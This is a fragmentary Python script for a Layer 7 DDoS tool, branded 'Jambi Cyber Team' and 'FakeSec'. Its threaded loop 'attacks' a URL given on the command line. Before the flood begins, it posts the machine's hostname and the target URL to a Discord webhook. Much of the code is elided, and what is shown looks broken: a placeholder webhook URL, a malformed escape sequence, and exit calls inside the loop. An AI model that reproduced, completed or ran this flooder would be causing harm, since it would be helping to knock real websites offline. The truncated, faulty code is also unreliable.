...
class fucker(threading.Thread):
    ...
    def request(self):
        ...
        print("[FakeSec] Attack [%s]\r"%(self.url))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                sys.stdout.write("[FakeSec] Attack [%s]\r"%(self.url))
                sys.exit(0)
        sys.exit(0)
...
("""
\033[0m 🇫​​​​​🇦​​​​​🇰​​​​​🇪​​​​​\\003[96m 🇸​​​​​🇪​​​​​🇨​​​​​
              Jambi Cyber Team DDoS Tool Layer7                                        
""")
        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(urls='usl', content=f'{hst} Has Started Flood To {url}')
        ...
        try:
            ...
            print("Usage: python3 ec.py https://example.com")
